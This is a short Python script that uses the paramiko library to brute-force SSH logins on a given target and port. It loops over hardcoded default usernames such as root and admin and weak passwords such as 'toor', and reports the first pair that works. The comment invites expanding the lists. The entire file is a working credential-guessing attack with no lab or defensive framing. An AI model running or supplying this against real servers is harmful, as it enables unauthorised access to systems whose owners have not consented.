import paramiko

# Demo credentials (you can expand)
USERNAMES = ["root", "admin"]
PASSWORDS = ["1234", "password", "toor"]

def run_brute_force(target, port=22):
    print(f"\n[+] Starting brute-force on {target}:{port}...\n")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for user in USERNAMES:
        for pw in PASSWORDS:
            try:
                ssh.connect(target, port=port, username=user, password=pw, timeout=1)
                print(f"[+] Found credentials: {user}:{pw}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                continue  # wrong creds, try next
            except paramiko.SSHException as e:
                print(f"[-] SSH error: {e}")
                continue
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                continue

    print("[-] No credentials found")
